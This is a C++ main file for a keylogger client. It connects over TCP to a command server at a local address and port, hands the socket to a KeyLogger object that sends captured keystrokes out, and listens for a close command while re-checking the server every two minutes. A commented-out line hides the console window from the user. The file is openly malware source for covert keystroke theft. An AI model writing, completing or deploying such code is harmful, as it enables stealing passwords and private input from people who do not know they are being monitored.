#include <iostream>
#include "TCPClient.hpp"
#include "KeyLoger.hpp"

#include <ctime>

int main(int argc, char **argv)
{
	const int serverCheckDelay = 2*60;
	TCPClient client;
	unsigned long timestamp;
	unsigned long chrono;
	char test[255];

	client.connectToHost("127.0.0.1", "4242");
	client.unblockSocket();
	KeyLogger::getInstance().setTCPClient(&client);
	// ShowWindow(GetConsoleWindow(), SW_HIDE); // Uncomment to hide console
	timestamp = std::time(nullptr);
	while (KeyLogger::getInstance().refreshNonBlocking())
	{
		int read = client.receiveData(&test, 10);
		if (read != -1)
		{
			if (read == sizeof(t_cmd))
			{
				t_cmd *command = reinterpret_cast<t_cmd *>(test);
				if (command->cmd == commandType::CLOSE)
				{
					return (0);
				}
			}
		}
		chrono = std::time(nullptr);
		if (chrono - timestamp >= serverCheckDelay) {
			KeyLogger::getInstance().checkServer();
			chrono = std::time(nullptr);
			timestamp = chrono;
		}
	}
	return 0;
}